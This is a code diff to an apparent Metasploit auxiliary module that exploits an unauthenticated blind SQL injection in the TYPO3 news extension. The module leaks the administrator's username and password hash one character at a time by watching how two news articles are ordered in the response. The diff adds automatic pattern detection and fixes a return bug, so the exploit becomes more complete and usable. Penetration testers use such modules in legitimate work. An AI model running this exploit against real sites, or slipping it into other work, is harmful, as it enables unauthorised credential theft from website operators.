@@ -16,6 +16,14 @@ class MetasploitModule < Msf::Auxiliary
          in the news module 5.3.2 and earlier, allows unauthenticated user to execute arbitrary
          SQL commands via vectors involving overwriteDemand for order and OrderByAllowed.
          This essentially means an attacker can obtain user credentials hashes.
+
+         This module tries to extract username and password hash of the administrator user.
+         It tries to inject sql and check every letter of a pattern, to see
+         if it belongs to the username or password it tries to alter the ordering of results. If
+         the letter doesn't belong to the word being extracted then all results are inverted
+         (News #2 appears before News #1, so Pattern2 before Pattern1), instead if the letter belongs
+         to the word being extracted then the results are in proper order (News #1 appers before News #2,
+         so Pattern1 before Pattern2)
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
@@ -29,10 +37,6 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'http://www.ambionics.io/blog/typo3-news-module-sqli' ], # Advisory
         ],
       'Privileged'     => false,
-      'Payload'        =>
-        {
-          'DisableNops' => true,
-        },
       'Platform'       => ['php'],
       'Arch'           => ARCH_PHP,
       'Targets'        => [[ 'Automatic', { }]],
@@ -43,8 +47,8 @@ class MetasploitModule < Msf::Auxiliary
       [
         OptString.new('TARGETURI', [true, 'The path of TYPO3', '/typo3/']),
         OptString.new('ID', [true, 'The id of TYPO3 news page', '1']),
-        OptString.new('PATTERN1', [true, 'Pattern of the first article', 'Article #1']),
-        OptString.new('PATTERN2', [true, 'Pattern of the first article', 'Article #2'])
+        OptString.new('PATTERN1', [false, 'Pattern of the first article title', 'Article #1']),
+        OptString.new('PATTERN2', [false, 'Pattern of the second article title', 'Article #2'])
       ])
   end
 
@@ -57,35 +61,38 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def dump_the_hash
+  def dump_the_hash(pattern1, pattern2)
     ascii_charset_lower = "a".upto("z").to_a.join('')
     ascii_charset_upper = "A".upto("Z").to_a.join('')
     ascii_charset = "#{ascii_charset_lower}#{ascii_charset_upper}"
     digit_charset = "0".upto("9").to_a.join('')
 
     full_charset = "#{ascii_charset_lower}#{ascii_charset_upper}#{digit_charset}$./"
-    username = blind('username','be_users', 'uid=1', ascii_charset, digit_charset)
+    username = blind('username','be_users', 'uid=1', ascii_charset, digit_charset, pattern1, pattern2)
     print_good("Username: #{username}")
-    password = blind('password','be_users', 'uid=1', full_charset, digit_charset)
+    password = blind('password','be_users', 'uid=1', full_charset, digit_charset, pattern1, pattern2)
     print_good("Password Hash: #{password}")
-    return [username, password]
   end
 
-  def blind(field, table, condition, charset, digit_charset)
+  def blind(field, table, condition, charset, digit_charset, pattern1, pattern2)
+    # Adding 9 so that the result has two digits, If the lenght is superior to 100-9 it won't work
+    offset = 9
     size = blind_size(
-     "length(#{field})+9",
+     "length(#{field})+#{offset}",
      table,
      condition,
      2,
-     digit_charset
+     digit_charset,
+     pattern1, pattern2
     )
-    size = size.to_i - 9
+    size = size.to_i - offset
     data = blind_size(
      field,
      table,
      condition,
      size,
-     charset
+     charset,
+     pattern1, pattern2
     )
     return data
   end
@@ -97,23 +104,23 @@ class MetasploitModule < Msf::Auxiliary
     return payload3
   end
 
-  def blind_size(field, table, condition, size, charset)
+  def blind_size(field, table, condition, size, charset,  pattern1, pattern2)
     str = ""
     for position in 0..size
       for char in charset.split('')
         payload = select_position(field, table, condition, position + 1, char)
         #print_status(payload)
-        if test(payload)
+        if test(payload, pattern1, pattern2)
           str += char.to_s
           #print_status(str)
           break
         end
       end
     end
-    return string
+    return str
   end
 
-  def test(payload)
+  def test(payload, pattern1, pattern2)
     res = send_request_cgi({
       'method'   => 'POST',
       'uri'      => normalize_uri(target_uri.path,'index.php'),
@@ -123,19 +130,48 @@ class MetasploitModule < Msf::Auxiliary
        },
        'vars_post' => {
          'tx_news_pi1[overwriteDemand][OrderByAllowed]' => payload,
-         'tx_news_pi1[search][maximumDate]' => '2017-12-31',
+         'tx_news_pi1[search][maximumDate]' => '', # Not required
          'tx_news_pi1[overwriteDemand][order]' => payload,
          'tx_news_pi1[search][subject]' => '',
-         'tx_news_pi1[search][minimumDate]' => '2017-01-01'
-       },
+         'tx_news_pi1[search][minimumDate]' => '' # Not required
+       }
     })
-    pattern1 = datastore['PATTERN1']
-    pattern2 = datastore['PATTERN2']
     return res.body.index(pattern1) < res.body.index(pattern2)
   end
 
+  def try_autodetect_patterns()
+    print_status("Trying to automatically determine Pattern1 and Pattern2...")
+    res = send_request_cgi({
+      'method'   => 'POST',
+      'uri'      => normalize_uri(target_uri.path,'index.php'),
+      'vars_get' => {
+        'id' => datastore['ID'],
+        'no_cache' => '1'
+       }
+    })
+    news = res.get_html_document.search('div[@itemtype="http://schema.org/Article"]');
+    pattern1 = defined?(news[0]) ? news[0].search('span[@itemprop="headline"]').text : ''
+    pattern2 = defined?(news[1]) ? news[1].search('span[@itemprop="headline"]').text : ''
+    if pattern1 != '' and pattern2 != ''
+      print_status("Pattern1: #{pattern1}")
+      print_status("Pattern2: #{pattern2}")
+    else
+      print_status("Couldn't determine Pattern1 and Pattern2 automatically, switching to user speficied values...")
+      pattern1 = datastore['PATTERN1']
+      pattern2 = datastore['PATTERN2']
+      print_status("Pattern1: #{pattern1}")
+      print_status("Pattern2: #{pattern2}")
+    end
+    return pattern1, pattern2
+  end
+
   def run
-    print_status("Dumping the username and password hash...")
-    dump_the_hash
+    pattern1, pattern2 = try_autodetect_patterns
+    if pattern1 == '' or pattern2 == ''
+      print_error("Impossible to determine pattern automatically, aborting...")
+    else
+      print_status("Dumping the username and password hash...")
+      dump_the_hash(pattern1, pattern2)
+    end
   end
 end
